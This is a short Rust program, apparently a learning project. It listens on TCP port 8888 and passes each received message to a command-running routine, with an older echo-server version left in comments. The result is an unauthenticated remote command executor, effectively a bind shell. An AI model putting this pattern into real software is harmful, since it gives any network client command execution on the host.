mod module;
use std::string;

use crate::module::RunCmd;
use crate::module::Server;
#[warn(unused_imports, unused_variables)]
#[tokio::main]
async fn main() {
    let mut buffer = String::new();
    let mut server = Server::start_server(8888).await;
    let cmd = RunCmd::new();
    loop {
        server.read_data().await;
        buffer = String::from_utf8_lossy(&server.buffer[..server.recived_bytes])
            .trim()
            .to_string();
        //println!("Buffer : {}", buffer);
        cmd.run_cmd(&buffer);
        println!("Buffer : {}", buffer);

        buffer.clear();
    }
}
//    let listner = TcpListener::bind("127.0.0.1:8888").await.unwrap();
//    // _ retrun the ipADDRR::port for the client
//    let (mut socket, _clientAdrr) = listner.accept().await.unwrap();
//    let (mut reader, mut write) = socket.split();
//    let mut buffer = [0; 1023];
//
//    loop {
//        let mut read_bytes = reader.read(&mut buffer).await.unwrap();
//
//        if read_bytes == 0 {
//            break;
//        }
//
//        write.write_all(&buffer[..read_bytes]).await.unwrap();
//
//        //socket.write_all("hello".to_string().as_bytes()).await();
//    }
